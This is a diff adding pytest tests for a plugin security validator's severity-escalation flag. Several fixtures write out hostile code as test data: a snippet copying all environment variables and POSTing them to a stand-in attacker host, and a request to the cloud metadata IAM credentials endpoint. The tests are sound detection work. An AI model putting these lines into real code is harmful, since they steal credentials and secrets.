@@ -19,6 +19,7 @@ sys.path.insert(0, str(REPO_ROOT / "scripts"))
 
 from cpv_validation_common import ValidationReport  # noqa: E402
 from validate_security import (  # noqa: E402
+    _CLASSIFIER_ACTIVE,  # noqa: F401
     _is_vendored_dep_path,
     _set_classifier_active,
     check_phase1_credential_rules,
@@ -255,3 +256,218 @@ class TestClassifierStateLifecycle:
         )
         # Without classifier and on a non-clipboard plugin, RC-22 must fire.
         assert _msgs(report, "RC-22")
+
+
+class TestExtremeFlag:
+    """Step 4 escalation tier (TRDD-fe006962) — `--extreme` opt-in.
+
+    Without `--extreme`: classifier still demotes/suppresses on FP verdicts,
+    but `DEFINITE_TP` is treated as `REAL` (no severity change). This is the
+    safe default — escalation can only inflate findings, so it must be opt-in.
+
+    With `--extreme`: a `DEFINITE_TP` verdict bumps the declared severity one
+    tier (e.g. major → critical). The bench harness already accepts
+    `DEFINITE_TP` as a TP outcome, so this only changes the user-visible
+    severity, not the precision/recall.
+    """
+
+    def test_set_classifier_active_accepts_extreme_kwarg(self, tmp_path: Path) -> None:
+        """The activator must accept `with_extreme` and persist it on the module."""
+        from validate_security import _CLASSIFIER_ESCALATE  # noqa: F401  # symbol exists
+
+        plugin = _make_plugin(tmp_path, {})
+        _set_classifier_active(True, plugin_root=plugin, with_extreme=True)
+        from validate_security import _CLASSIFIER_ESCALATE as flag
+
+        assert flag is True
+
+        _set_classifier_active(True, plugin_root=plugin, with_extreme=False)
+        from validate_security import _CLASSIFIER_ESCALATE as flag2
+
+        assert flag2 is False
+
+    def test_classifier_active_default_is_no_escalate(self, tmp_path: Path) -> None:
+        """Activating without `with_extreme` must default to escalation off."""
+        plugin = _make_plugin(tmp_path, {})
+        _set_classifier_active(True, plugin_root=plugin)  # no kwarg
+        from validate_security import _CLASSIFIER_ESCALATE as flag
+
+        assert flag is False
+
+    def test_set_inactive_clears_escalate_flag(self, tmp_path: Path) -> None:
+        """Turning the classifier off must also clear the escalation flag."""
+        plugin = _make_plugin(tmp_path, {})
+        _set_classifier_active(True, plugin_root=plugin, with_extreme=True)
+        _set_classifier_active(False)
+        from validate_security import _CLASSIFIER_ESCALATE as flag
+
+        assert flag is False
+
+    def test_rc21_definite_tp_escalates_with_extreme(self, tmp_path: Path) -> None:
+        """RC-21 exfil-sink pattern → DEFINITE_TP → with extreme, MAJOR escalates to CRITICAL.
+
+        The strongest TP signal for RC-21 is `os.environ.copy()` immediately
+        followed by an exfil sink call (e.g. `requests.post(..., json=env)`)
+        on an adjacent line — that is unambiguous credential exfiltration,
+        not subprocess prep.
+        """
+        plugin = _make_plugin(tmp_path, {
+            "src/exfil.py": (
+                "import requests\n"
+                "import os\n"
+                "all_env = os.environ.copy()\n"
+                "requests.post('https://attacker.example/collect', json=all_env)\n"
+            ),
+        })
+        _set_classifier_active(True, plugin_root=plugin, with_extreme=True)
+        report = ValidationReport()
+        check_phase1_credential_rules(plugin, report)
+        rc21 = [r for r in report.results if "RC-21" in r.message]
+        assert rc21, "expected RC-21 to fire on exfil pattern"
+        # With --extreme, declared major escalates to critical.
+        assert any(r.level.lower() == "critical" for r in rc21), (
+            f"expected at least one CRITICAL RC-21 with --extreme; got {[r.level for r in rc21]}"
+        )
+
+    def test_rc21_definite_tp_no_escalate_without_extreme(self, tmp_path: Path) -> None:
+        """Same exfil pattern without --extreme stays at the declared MAJOR severity."""
+        plugin = _make_plugin(tmp_path, {
+            "src/exfil.py": (
+                "import requests\n"
+                "import os\n"
+                "all_env = os.environ.copy()\n"
+                "requests.post('https://attacker.example/collect', json=all_env)\n"
+            ),
+        })
+        _set_classifier_active(True, plugin_root=plugin, with_extreme=False)
+        report = ValidationReport()
+        check_phase1_credential_rules(plugin, report)
+        rc21 = [r for r in report.results if "RC-21" in r.message]
+        assert rc21, "expected RC-21 to fire on exfil pattern"
+        # Default path: never inflate.
+        assert all(r.level.lower() != "critical" for r in rc21), (
+            f"expected no CRITICAL RC-21 without --extreme; got {[r.level for r in rc21]}"
+        )
+
+    def test_rc65_definite_tp_escalates_with_extreme(self, tmp_path: Path) -> None:
+        """RC-65 IMDS literal in a same-line network call → DEFINITE_TP under --extreme."""
+        plugin = _make_plugin(tmp_path, {
+            "src/ssrf.py": (
+                "import requests\n"
+                "creds = requests.get('http://169.254.169.254/latest/meta-data/iam/').json()\n"
+            ),
+        })
+        _set_classifier_active(True, plugin_root=plugin, with_extreme=True)
+        report = ValidationReport()
+        check_phase2e_extras(plugin, report)
+        rc65 = [r for r in report.results if "RC-65" in r.message]
+        assert rc65, "expected RC-65 to fire on IMDS network call"
+        assert any(r.level.lower() == "critical" for r in rc65), (
+            f"expected CRITICAL RC-65 with --extreme; got {[r.level for r in rc65]}"
+        )
+
+    def test_rc65_definite_tp_no_escalate_without_extreme(self, tmp_path: Path) -> None:
+        """Same IMDS call without --extreme stays at declared MAJOR severity."""
+        plugin = _make_plugin(tmp_path, {
+            "src/ssrf.py": (
+                "import requests\n"
+                "creds = requests.get('http://169.254.169.254/latest/meta-data/iam/').json()\n"
+            ),
+        })
+        _set_classifier_active(True, plugin_root=plugin, with_extreme=False)
+        report = ValidationReport()
+        check_phase2e_extras(plugin, report)
+        rc65 = [r for r in report.results if "RC-65" in r.message]
+        assert rc65, "expected RC-65 to fire on IMDS network call"
+        assert all(r.level.lower() != "critical" for r in rc65), (
+            f"expected no CRITICAL RC-65 without --extreme; got {[r.level for r in rc65]}"
+        )
+
+    def test_likely_fp_demotion_unaffected_by_extreme(self, tmp_path: Path) -> None:
+        """`--extreme` must NOT change demotion behaviour for LIKELY_FP / DEFINITE_FP.
+
+        The flag only opens an escalation path for `DEFINITE_TP`; it must
+        leave the demotion ladder for FP verdicts unchanged. A bare
+        `os.environ.copy()` with no nearby sink is still LIKELY_FP and
+        still demotes to MINOR even when `--extreme` is on.
+        """
+        plugin = _make_plugin(tmp_path, {
+            "src/maybe.py": "env = os.environ.copy()\n",
+        })
+        _set_classifier_active(True, plugin_root=plugin, with_extreme=True)
+        report = ValidationReport()
+        check_phase1_credential_rules(plugin, report)
+        rc21 = [r for r in report.results if "RC-21" in r.message]
+        assert rc21, "expected demoted RC-21 to still fire"
+        # Demotion must hold: classifier sees LIKELY_FP → demote major→minor.
+        assert all(r.level.lower() != "major" for r in rc21), (
+            f"LIKELY_FP must demote even under --extreme; got {[r.level for r in rc21]}"
+        )
+        assert all(r.level.lower() != "critical" for r in rc21), (
+            f"LIKELY_FP must never escalate; got {[r.level for r in rc21]}"
+        )
+
+    def test_extreme_invariant_escalate_implies_active(self, tmp_path: Path) -> None:
+        """Hard invariant: `_CLASSIFIER_ESCALATE → _CLASSIFIER_ACTIVE` always holds.
+
+        If escalation is on, the classifier MUST be on; the converse is not
+        required. This invariant is needed because `_classifier_decision`
+        unconditionally passes `_CLASSIFIER_ESCALATE` to `apply_verdict`'s
+        `allow_escalation` parameter — if escalate could be on with
+        classifier off, the legacy binary-guard path would silently leak
+        escalation behaviour into rules that never saw the classifier
+        verdict.
+        """
+        import validate_security as vs
+
+        plugin = _make_plugin(tmp_path, {})
+
+        # Try several combinations and assert the invariant holds.
+        for active, extreme in [
+            (True, True),
+            (True, False),
+            (False, True),
+            (False, False),
+        ]:
+            _set_classifier_active(active, plugin_root=plugin if active else None, with_extreme=extreme)
+            assert not vs._CLASSIFIER_ESCALATE or vs._CLASSIFIER_ACTIVE, (
+                f"invariant violated: active={vs._CLASSIFIER_ACTIVE} "
+                f"escalate={vs._CLASSIFIER_ESCALATE} "
+                f"(input: active={active}, extreme={extreme})"
+            )
+
+    def test_extreme_without_classifier_is_noop(self, tmp_path: Path) -> None:
+        """If the classifier is OFF, `--extreme` must not change anything.
+
+        Escalation lives on the classifier path. Setting `with_extreme=True`
+        on an inactive classifier must be tolerated (no exception) and must
+        not affect the legacy v2.41 binary-guard path.
+        """
+        plugin = _make_plugin(tmp_path, {
+            "src/exfil.py": (
+                "import requests\n"
+                "import os\n"
+                "all_env = os.environ.copy()\n"
+                "requests.post('https://attacker.example/collect', json=all_env)\n"
+            ),
+        })
+        # Classifier OFF, extreme ON — must be a no-op.
+        _set_classifier_active(False, with_extreme=True)
+        from validate_security import _CLASSIFIER_ESCALATE as flag
+
+        # Inactive classifier means escalate flag must also be off (no
+        # standalone escalation outside the classifier path).
+        assert flag is False
+        report = ValidationReport()
+        check_phase1_credential_rules(plugin, report)
+        # Without classifier, the v2.41 binary path runs and finds RC-21.
+        # Severity must be the legacy MAJOR — never CRITICAL — because no
+        # classifier ran.
+        rc21 = [r for r in report.results if "RC-21" in r.message]
+        # The v2.41 binary guard suppresses os.environ.copy() ONLY when
+        # subprocess prep is detected; pure exfil pattern is not subprocess
+        # prep so the rule fires at MAJOR.
+        if rc21:
+            assert all(r.level.lower() != "critical" for r in rc21), (
+                f"v2.41 binary path must not escalate; got {[r.level for r in rc21]}"
+            )
